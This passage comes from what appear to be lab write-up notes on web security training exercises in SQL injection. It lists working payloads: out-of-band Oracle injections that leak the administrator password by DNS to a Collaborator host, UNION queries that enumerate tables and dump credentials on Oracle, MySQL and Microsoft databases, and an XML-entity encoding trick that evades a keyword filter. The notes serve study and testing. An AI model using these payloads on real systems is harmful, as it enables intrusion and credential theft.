    * ```Z0nGssfkht0dznld'%3b+LOAD_FILE('\\\\9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com\\a')--+``` (URL-encoded)
  
  * Oracle payloads:

    * ```Z0nGssfkht0dznld' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/"> %remote;]>'),'/l') FROM dual--``` (without URL encoding we get 500 Server Error, due to special characters)
    * ```Z0nGssfkht0dznld'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--``` (URL-encoded)

* the URL-encoded Oracle DB payload form of ```' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<collaborator-payload>/"> %remote;]>'),'/l') FROM dual--``` works and we get responses in Burp Collaborator

* this confirms Oracle is used in backend, and for data exfiltration we can use Oracle-specific payloads: the query data is included in the subdomain

* to fetch the password of the 'administrator' user, we need to fetch the query output ```SELECT password FROM users WHERE username = 'administrator'```

* referring the payload format from the cheatsheet, our final payload would be -

  ```sql
  ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/"> %remote;]>'),'/l') FROM dual--
  ```

* now, we need to use the URL-encoded form of this payload: ```Z0nGssfkht0dznld'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username+%3d+'administrator')||'.9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--```

* once this payload is used, we can navigate to Collaborator , and check the DNS requests received for the subdomain

* in the DNS lookup request of AAAA type for the domain name, we can see the password is concatenated with the rest of the domain: we can now use this password and login as 'administrator'

14. ### SQL injection attack, querying the database type and version on Oracle

* given that a SQLi vuln is present in the product category filter, we need to fetch the DB version: it is also mentioned the backend is using Oracle DB

* in Burp Suite, intercept a valid request to any of the category pages, and send to Repeater

* first we need to determine the number of columns: URL-encoded payloads are needed here:

  * ```/filter?category=Pets'+UNION+SELECT+NULL+FROM+dual--``` - 500 Internal Server Error
  * ```/filter?category=Pets'+UNION+SELECT+NULL,NULL+FROM+dual--``` - 200 OK

* next, we need to find which column supports text data:

  * ```/filter?category=Pets'+UNION+SELECT+'a',NULL+FROM+dual--``` - 200 OK

* as first column supports text data, we can use it to get the query output of ```SELECT banner FROM v$version``` or ```SELECT version FROM v$instance```:

  * ```/filter?category=Pets'+UNION+SELECT+banner,NULL+FROM+v$version--``` - this works and we get the version info

15. ### SQL injection attack, querying the database type and version on MySQL and Microsoft

* given that a SQLi vuln is present in the product category filter, we need to fetch the DB version: it is also mentioned the backend is using MySQL or Microsoft DB

* in Burp Suite, intercept a valid request to any of the category pages, and send to Repeater

* first, determine number of columns:

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL--+``` - 500 Internal Server Error
  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--+``` - 200 OK

* next, find which column supports text data:

  * ```/filter?category=Lifestyle'+UNION+SELECT+'a',NULL--+``` - 200 OK

* as the first column supports text, we can use it to get the query output of ```SELECT @@version```:

  * ```/filter?category=Lifestyle'+UNION+SELECT+%40%40version,NULL--+``` - this works and we get the version info

16. ### SQL injection attack, listing the database contents on non-Oracle databases

* given that a SQLi vuln is present in the product category filter, we need to fetch the password of the 'administrator' user

* in Burp Suite, intercept a valid request to any of the category pages, and send to Repeater

* first, find number of columns:

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL--``` - 500 Internal Server Error
  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--``` - 200 OK

* next, from the 2 columns, find which ones support text data:

  * ```/filter?category=Lifestyle'+UNION+SELECT+'a','a'--``` - 200 OK

* both columns support text data, so we can fetch the table details next: we can fetch the 'table_name' column from ```information_schema.tables```:

  * ```/filter?category=Lifestyle'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--``` - 200 OK

* using the above payload, we get the list of table names: the table 'users_kbtoxd' is non-default and likely contains user info

* fetch the column names for this table next:

  * ```/filter?category=Lifestyle'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_kbtoxd'--```

* this gives us the column names 'password_ksfzsl' & 'username_lvhsaz': we can use this information to fetch the password for 'administrator':

  * ```/filter?category=Lifestyle'+UNION+SELECT+password_ksfzsl,username_lvhsaz+FROM+users_kbtoxd+WHERE+username_lvhsaz='administrator'--```

* the response contains the password for 'administrator': we can use this to login

17. ### SQL injection attack, listing the database contents on Oracle

* given that a SQLi vuln is present in the product category filter, we need to fetch the password of the 'administrator' user: it is given that the backend is using Oracle DB

* in Burp Suite, intercept a valid request to any of the category pages, and send to Repeater

* first, identify number of columns:

  * ```/filter?category=Gifts'+UNION+SELECT+NULL+FROM+dual--``` - 500 Internal Server Error
  * ```/filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+dual--``` - 200 OK

* next, check if the columns support text data:

  * ```/filter?category=Gifts'+UNION+SELECT+'a','a'+FROM+dual--``` - 200 OK

* now, we can fetch the table names from ```all_tables```:

  * ```/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--``` - 200 OK

* this gives a lot of table names, but the non-default users table 'USERS_GRRVAQ' would have the user data

* fetch the column names for this user table now using ```all_tab_columns```:

  * ```/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GRRVAQ'--``` - 200 OK

* this gives us the columns 'PASSWORD_TXVZBQ' and 'USERNAME_STIVOK': fetch the password for 'administrator':

  * ```/filter?category=Gifts'+UNION+SELECT+PASSWORD_TXVZBQ,USERNAME_STIVOK+FROM+USERS_GRRVAQ+WHERE+USERNAME_STIVOK='administrator'--``` - 200 OK

* using this payload, we get the creds for 'administrator': we can now login

18. ### SQL injection with filter bypass via XML encoding

* given, the webapp has a SQLi vuln in its stock check feature; we need to fetch the admin user's creds from the 'users' table

* navigate to one of the products in the website; in Burp Suite, intercept the request for selecting the 'check stock' button (for some reason, using Repeater does not work as expected)

* we can see that it is a POST request to '/product/stock', with the following XML data:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
  <productId>
  2
  </productId>
  <storeId>
  3
  </storeId>
  </stockCheck>
  ```

* with the normal unedited data, the response gives the number of units available

* we can test for SQLi payloads in the 'productId' and 'storeId' values:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2 SELECT * FROM information_schema.tables</productId><storeId>3 SELECT * FROM information_schema.tables</storeId></stockCheck>
  ```

* if we submit this payload, we get a page with the response "Attack detected": the webapp filter is likely detecting strings like 'SELECT' and 'FROM'

* we can try XML escape sequences using HTML entity strings: we can encode the string into hex HTML entities using [CyberChef](https://gchq.github.io/CyberChef/):

  * we can first check with basic queries like ```SELECT table_name FROM information_schema.tables```, in encoded form: testing both fields:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1 &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;</productId><storeId>1</storeId></stockCheck>
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;</storeId></stockCheck>
    ```
  
  * this does not give any response, so we can try a modified query ```UNION SELECT table_name FROM information_schema.tables```:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;</productId><storeId>1</storeId></stockCheck>
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;</storeId></stockCheck>
    ```
  
  * the second payload works, indicating that the 'storeId' parameter is vulnerable to SQLi: and we get a list of tables

  * the list of tables includes the non-default 'users' table: we can check its column names next using the query ```UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'```:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;</storeId></stockCheck>
    ```
  
  * this shows the columns 'email', 'password' and 'username'

  * we can fetch the password for the 'administrator' user now with the encoded query ```UNION SELECT password FROM users WHERE username='administrator'```:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;</storeId></stockCheck>
    ```
  
  * this works and we get the password in the response; we can use this to login as admin user
